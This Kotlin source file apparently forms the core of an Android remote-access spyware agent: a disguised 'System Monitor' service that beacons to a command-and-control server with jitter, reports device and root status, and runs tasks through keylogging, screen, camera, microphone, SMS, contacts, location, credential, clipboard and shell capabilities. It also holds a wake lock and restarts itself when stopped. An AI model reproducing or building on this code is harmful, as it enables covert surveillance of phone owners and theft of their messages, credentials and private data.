package com.system.monitor

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Binder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.system.monitor.capabilities.*
import com.system.monitor.speedmon.SpeedMonActivity
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets
import java.security.KeyFactory
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.SecureRandom
import java.security.spec.PKCS8EncodedKeySpec
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

const val DEFAULT_C2_SERVER = "https://c2.example.com/api"
const val BEACON_INTERVAL = 30000L
const val JITTER_PERCENT = 0.2
const val PREFS_NAME = "agent_config"
const val KEY_C2_SERVER = "c2_server"
const val KEY_PERSISTENT = "persistent_mode"

class AgentService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private var agentId: String? = null
    private var aesKey: SecretKey? = null
    private var rsaPublicKey: java.security.PublicKey? = null
    private val gson = Gson()
    private val capabilities = mutableMapOf<String, Capability>()
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaRecorder: MediaRecorder? = null
    private var cameraManager: CameraManager? = null
    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val latestFrame = java.util.concurrent.atomic.AtomicReference<ByteArray>()
    private val streaming = java.util.concurrent.atomic.AtomicBoolean(false)
    private var streamExecutor: java.util.concurrent.ScheduledExecutorService? = null
    private var frameRate = 15
    private var quality = 70
    private var scale = 1.0f
    private var remoteAccessibilityService: RemoteAccessibilityService? = null
    private var persistentMode = true
    private var commandReceiver: CommandReceiver? = null

    inner class LocalBinder : Binder() {
        fun getService(): AgentService = this@AgentService
    }

    override fun onCreate() {
        super.onCreate()
        try {
            loadConfig()
            acquireWakeLock()
            initCrypto()
            registerCapabilities()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerCommandReceiver()
            thread(name = "agent-beacon") { beaconLoop() }
            Log.d("AgentService", "Service created successfully, persistentMode=$persistentMode")
        } catch (e: Exception) {
            Log.e("AgentService", "Error in onCreate", e)
            stopSelf()
        }
    }

    private fun loadConfig() {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
        } catch (e: Exception) {
            Log.e("AgentService", "Error loading config", e)
        }
    }

    private fun getC2Server(): String {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
        } catch (e: Exception) {
            return DEFAULT_C2_SERVER
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::wakelock")
            wakeLock?.acquire()
        } catch (e: Exception) {
            Log.e("AgentService", "Error acquiring wake lock", e)
        }
    }

    private fun initCrypto() {
        try {
            val keyGen = KeyPairGenerator.getInstance("RSA")
            keyGen.initialize(2048)
            val keyPair = keyGen.generateKeyPair()
            val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
            prefs.edit()
                .putString("private_key", Base64.encodeToString(keyPair.private.encoded, Base64.NO_WRAP))
                .putString("public_key", Base64.encodeToString(keyPair.public.encoded, Base64.NO_WRAP))
                .apply()
            rsaPublicKey = keyPair.public

            val aesGen = KeyGenerator.getInstance("AES")
            aesGen.init(256)
            aesKey = aesGen.generateKey()
        } catch (e: Exception) {
            Log.e("AgentService", "Error initializing crypto", e)
        }
    }

    private fun registerCapabilities() {
        try {
            capabilities["keylogger"] = KeyloggerCapability(this)
            capabilities["screen"] = ScreenCapability(this)
            capabilities["audio"] = AudioCapability(this)
            capabilities["camera"] = CameraCapability(this)
            capabilities["location"] = LocationCapability(this)
            capabilities["contacts"] = ContactsCapability(this)
            capabilities["sms"] = SmsCapability(this)
            capabilities["call_logs"] = CallLogsCapability(this)
            capabilities["files"] = FilesCapability(this)
            capabilities["apps"] = AppsCapability(this)
            capabilities["wifi"] = WifiCapability(this)
            capabilities["shell"] = ShellCapability(this)
            capabilities["creds"] = CredsCapability(this)
            capabilities["clipboard"] = ClipboardCapability(this)
            capabilities["notifications"] = NotificationsCapability(this)
            capabilities["remote_control"] = RemoteControlCapability(this)
        } catch (e: Exception) {
            Log.e("AgentService", "Error registering capabilities", e)
        }
    }

    private fun registerCommandReceiver() {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter("com.system.monitor.ACTION_COMMAND")
        // Use regular broadcast for cross-app communication
        registerReceiver(commandReceiver!!, filter, Context.RECEIVER_NOT_EXPORTED)
    }

    private fun beaconLoop() {
        while (running) {
            try {
                beacon()
            } catch (e: Exception) {
                Log.e("Agent", "Beacon error", e)
            }
            try {
                val jitter = (BEACON_INTERVAL * JITTER_PERCENT * (Math.random() * 2 - 1)).toLong()
                Thread.sleep(BEACON_INTERVAL + jitter)
            } catch (e: InterruptedException) {
                return
            }
        }
    }

    private fun beacon() {
        if (agentId == null) {
            registerAgent()
            return
        }
        val tasks = fetchTasks()
        tasks.forEach { task ->
            thread(name = "task-${task.id}") { executeTask(task) }
        }
    }

    private fun registerAgent() {
        try {
            val payload = mapOf(
                "agent_id" to generateAgentId(),
                "hostname" to Build.MODEL,
                "os" to "android",
                "arch" to System.getProperty("os.arch"),
                "android_version" to Build.VERSION.RELEASE,
                "sdk" to Build.VERSION.SDK_INT.toString(),
                "privileged" to isRooted().toString()
            )
            val resp = post("/register", payload)
            resp?.let { agentId = it["agent_id"] as? String }
        } catch (e: Exception) {
            Log.e("Agent", "Register error", e)
        }
    }

    private fun fetchTasks(): List<Task> {
        try {
            val payload = mapOf("agent_id" to agentId!!)
            val resp = post("/tasks", payload)
            val tasksJson = resp?.get("tasks")
            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
        } catch (e: Exception) {
            Log.e("Agent", "Fetch tasks error", e)
            return emptyList()
        }
    }

    private fun executeTask(task: Task) {
        val capability = capabilities[task.capability] ?: return
        var output: Any? = null
        var error: String? = null
        var status = "completed"
        try {
            output = capability.execute(task.args)
        } catch (e: Exception) {
            error = e.message
            status = "failed"
        }
        sendLocalResult(task.id, output, error, status)
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun onProjectionResult(resultCode: Int, data: Intent?) {
        if (resultCode != android.app.Activity.RESULT_OK || data == null) {
            streaming.set(false)
            return
        }
        val projectionMgr = getSystemService(MediaProjectionManager::class.java)
        projection = projectionMgr.getMediaProjection(resultCode, data)
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return if (persistentMode) START_STICKY else START_NOT_STICKY
    }

    override fun onDestroy() {
        running = false
        wakeLock?.release()
        capabilities.values.forEach { it.cleanup() }
        stopStream()
        val receiver = commandReceiver
        if (receiver != null) {
            try {
                unregisterReceiver(receiver)
            } catch (e: Exception) {
                Log.w("AgentService", "Unregister receiver failed", e)
            }
        }
        // Restart service if persistent mode
        if (persistentMode) {
            val restartIntent = Intent(this, AgentService::class.java)
            startService(restartIntent)
        }
        super.onDestroy()
    }

    private fun stopStream() {
        streaming.set(false)
        streamExecutor?.shutdownNow()
        virtualDisplay?.release()
        imageReader?.close()
        projection?.stop()
        projection = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("agent_service", "System Monitor", NotificationManager.IMPORTANCE_LOW).apply {
                description = "System monitoring service"
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, SpeedMonActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, "agent_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    interface Capability {
        fun execute(args: String?): Any
        fun cleanup()
    }

    data class Task(
        val id: String,
        val capability: String,
        val args: String?,
        val timeout: Int,
        val ticketId: String? = null
    )

    data class Result(
        val taskId: String,
        val agentId: String,
        val output: Any?,
        val error: String?,
        val status: String
    )

    private inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()

            val capabilityImpl = capabilities[capability] ?: run {
                sendLocalResult(taskId, null, "Unknown capability: $capability", "failed")
                return
            }

            thread(name = "agent-task-$taskId") {
                var output: Any? = null
                var error: String? = null
                var status = "completed"
                try {
                    output = capabilityImpl.execute(argsJson)
                } catch (e: Exception) {
                    error = e.message
                    status = "failed"
                }
                sendLocalResult(taskId, output, error, status)
            }
        }
    }

    private fun sendLocalResult(taskId: String, result: Any?, error: String?, status: String) {
        val intent = Intent("com.system.monitor.ACTION_RESULT").apply {
            putExtra("task_id", taskId)
            putExtra("result", result?.toString() ?: "")
            putExtra("error", error ?: "")
            putExtra("status", status)
        }
        sendBroadcast(intent)
    }

    private fun generateAgentId(): String {
        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
        return prefs.getString("agent_id", "") ?: java.util.UUID.randomUUID().toString().also {
            prefs.edit().putString("agent_id", it).apply()
        }
    }

    private fun isRooted(): Boolean {
        return try {
            Runtime.getRuntime().exec("su").waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    private fun post(endpoint: String, payload: Map<String, Any>): Map<String, Any>? {
        try {
            val url = URL("${getC2Server()}$endpoint")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Agent-ID", agentId ?: "")

            val json = gson.toJson(payload)
            conn.outputStream.write(json.toByteArray(StandardCharsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val response = conn.inputStream.readAllBytes()
                val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
                return gson.fromJson(String(response, StandardCharsets.UTF_8), type)
            }
        } catch (e: Exception) {
            Log.e("Agent", "Post error", e)
        }
        return null
    }
}